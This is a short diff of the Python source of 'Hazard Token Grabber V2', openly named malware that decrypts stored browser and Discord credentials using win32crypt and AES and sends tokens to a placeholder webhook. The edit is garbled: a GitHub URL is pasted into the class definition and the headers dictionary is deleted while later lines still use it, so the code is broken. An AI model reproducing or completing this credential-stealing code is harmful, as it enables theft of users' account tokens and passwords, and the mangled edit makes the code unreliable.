@@ -14,7 +14,7 @@ from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
 
-class Hazard_Token_Grabber_V2:
+class Hazard_Token_Grabber_V2:https://github.com/Rdimo/Hazard-Token-Grabber-V2/tree/Rdimo:master
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
         self.files = ""
@@ -67,10 +67,7 @@ class Hazard_Token_Grabber_V2:
         shutil.rmtree(self.tempfolder)
         
     def getheaders(self, token=None, content_type="application/json"):
-        headers = {
-            "Content-Type": content_type,
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-        }
+       
         if token:
             headers.update({"Authorization": token})
         return headers
